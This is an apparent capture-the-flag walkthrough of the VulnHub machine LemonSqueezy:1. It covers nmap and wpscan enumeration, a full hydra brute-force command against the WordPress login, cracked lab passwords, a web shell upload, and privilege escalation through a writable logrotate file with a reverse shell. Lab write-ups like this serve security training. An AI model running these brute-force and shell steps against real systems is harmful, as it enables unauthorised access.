


# LemonSqueezy : 1 Walkthrough 

**VulnHub Link:** [LemonSqueezy:1](https://www.vulnhub.com/entry/lemonsqueezy-1,473/)
**Difficulty:** Easy
**Release Date:** 26 Apr 2020

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.131
```


## 2.Web Enumeration

```bash
dirb http://ip
```
```bash
wpscan --url <url> -e ap,u ---> orange,lemon users found
```

## 3.Brute Forcing
```bash
hydra lemonsqueezy -L usernames.txt -P /usr/share/wordlists/rockyou.txt http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2Flemonsqueezy%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=Lost your password?"
```
orange's password found ---> ginger

wordpress --> orange's password at phpmyadmin found ---> n0t1n@w0rdl1st!

in phpmyadmin ---> lemon user's password changed into lemon and hashed with MD5


## 4.Privilege Escalation

at wordpress, shell uploaded ---> user flag captured
```bash
find / -type f -writable 2>/dev/null ---> /etc/legrotate.d/logrotate
```
modified via python reverse shell script and pspy64 uploaded 

then root shell opened ----> root flag captured.
